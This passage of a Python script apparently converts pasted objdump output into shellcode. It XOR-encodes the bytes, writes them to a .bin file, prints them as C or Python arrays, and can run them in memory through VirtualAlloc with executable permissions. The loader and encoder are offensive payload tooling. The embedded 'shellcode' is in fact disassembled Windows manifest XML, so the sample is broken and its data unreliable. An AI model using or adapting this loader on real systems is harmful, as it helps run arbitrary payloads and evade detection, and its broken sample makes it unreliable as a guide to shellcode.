  404513:	65 71 75             	gs jno 0x40458b
  404516:	65 73 74             	gs jae 0x40458d
  404519:	65 64 45             	gs fs inc ebp
  40451c:	78 65                	js     0x404583
  40451e:	63 75 74             	arpl   WORD PTR [ebp+0x74],si
  404521:	69 6f 6e 4c 65 76 65 	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  404528:	6c                   	ins    BYTE PTR es:[edi],dx
  404529:	20 6c 65 76          	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40452d:	65 6c                	gs ins BYTE PTR es:[edi],dx
  40452f:	3d 22 61 73 49       	cmp    eax,0x49736122
  404534:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404535:	76 6f                	jbe    0x4045a6
  404537:	6b 65 72 22          	imul   esp,DWORD PTR [ebp+0x72],0x22
  40453b:	20 75 69             	and    BYTE PTR [ebp+0x69],dh
  40453e:	41                   	inc    ecx
  40453f:	63 63 65             	arpl   WORD PTR [ebx+0x65],sp
  404542:	73 73                	jae    0x4045b7
  404544:	3d 22 66 61 6c       	cmp    eax,0x6c616622
  404549:	73 65                	jae    0x4045b0
  40454b:	22 2f                	and    ch,BYTE PTR [edi]
  40454d:	3e 0d 0a 20 20 20    	ds or  eax,0x2020200a
  404553:	20 20                	and    BYTE PTR [eax],ah
  404555:	20 3c 2f             	and    BYTE PTR [edi+ebp*1],bh
  404558:	72 65                	jb     0x4045bf
  40455a:	71 75                	jno    0x4045d1
  40455c:	65 73 74             	gs jae 0x4045d3
  40455f:	65 64 50             	gs fs push eax
  404562:	72 69                	jb     0x4045cd
  404564:	76 69                	jbe    0x4045cf
  404566:	6c                   	ins    BYTE PTR es:[edi],dx
  404567:	65 67 65 73 3e       	gs addr16 gs jae 0x4045aa
  40456c:	0d 0a 20 20 20       	or     eax,0x2020200a
  404571:	20 3c 2f             	and    BYTE PTR [edi+ebp*1],bh
  404574:	73 65                	jae    0x4045db
  404576:	63 75 72             	arpl   WORD PTR [ebp+0x72],si
  404579:	69 74 79 3e 0d 0a 20 	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404580:	20 
  404581:	3c 2f                	cmp    al,0x2f
  404583:	74 72                	je     0x4045f7
  404585:	75 73                	jne    0x4045fa
  404587:	74 49                	je     0x4045d2
  404589:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40458a:	66 6f                	outs   dx,WORD PTR ds:[esi]
  40458c:	3e 0d 0a 3c 2f 61    	ds or  eax,0x612f3c0a
  404592:	73 73                	jae    0x404607
  404594:	65 6d                	gs ins DWORD PTR es:[edi],dx
  404596:	62 6c 79 3e          	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40459a:	00 00                	add    BYTE PTR [eax],al
  40459c:	00 00                	add    BYTE PTR [eax],al
"""

# Configuration
XOR_KEY = 0xAA  # Optional XOR key
OUTPUT_FILE = "shellcode.bin"

def xor_encode(shellcode, key=XOR_KEY):
    """XOR-encode shellcode to avoid null bytes."""
    return bytes([b ^ key for b in shellcode])

def parse_hardcoded_objdump():
    """Extracts opcodes from hardcoded objdump output."""
    shellcode = bytearray()
    opcode_regex = re.compile(r'^\s*[0-9a-f]+:\s+((?:[0-9a-f]{2}\s)+)', re.MULTILINE)
    
    matches = opcode_regex.finditer(OBJDUMP_OUTPUT)
    for match in matches:
        opcodes = match.group(1).strip().split()
        shellcode.extend(int(op, 16) for op in opcodes)
    return bytes(shellcode)

def format_shellcode(shellcode, format_type="c", bytes_per_line=16):
    """Formats shellcode for C or Python."""
    formatted = []
    for i in range(0, len(shellcode), bytes_per_line):
        chunk = shellcode[i:i+bytes_per_line]
        hex_str = "".join([f"\\x{b:02x}" for b in chunk])
        if format_type == "c":
            formatted.append(f'"{hex_str}"')
        else:
            formatted.append(f'buf += b"{hex_str}"')
    return "\n".join(formatted)

def write_shellcode_to_file(shellcode, filename):
    """Writes raw shellcode to a file."""
    try:
        with open(filename, "wb") as f:
            f.write(shellcode)
        print(f"[+] Raw shellcode saved to: {filename}")
    except Exception as e:
        print(f"[!] Failed to write file: {e}")

def test_shellcode(shellcode):
    """Executes shellcode in memory (for testing)."""
    try:
        ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x1000, 0x40)
        if not ptr:
            print("[!] Failed to allocate memory")
            return False
        windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
        windll.kernel32.FlushInstructionCache(windll.kernel32.GetCurrentProcess(), ptr, len(shellcode))
        func_type = CFUNCTYPE(None)
        func = cast(ptr, func_type)
        print("[+] Executing shellcode...")
        func()
        windll.kernel32.VirtualFree(ptr, 0, 0x8000)
        return True
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Convert hardcoded objdump output to shellcode.")
    parser.add_argument("--output", help="Output .bin file (default: shellcode.bin)", default=OUTPUT_FILE)
    parser.add_argument("--format", help="Output format: c (default) or python", default="c")
    parser.add_argument("--xor", help="Enable XOR encoding", action="store_true")
    parser.add_argument("--test", help="Test shellcode execution", action="store_true")
    args = parser.parse_args()

    shellcode = parse_hardcoded_objdump()
    if not shellcode:
        print("[!] No shellcode extracted. Check OBJDUMP_OUTPUT variable.")
        return

    print(f"[+] Shellcode size: {len(shellcode)} bytes")
    if args.xor:
        shellcode = xor_encode(shellcode)
        print(f"[+] XOR-encoded with key 0x{XOR_KEY:02x}")

    write_shellcode_to_file(shellcode, args.output)
    print(f"\n// --- {args.format.upper()} Shellcode ---")
    print(format_shellcode(shellcode, args.format))

    if args.test:
        print("\n[+] Testing shellcode...")
        test_shellcode(shellcode)

if __name__ == "__main__":
    main()



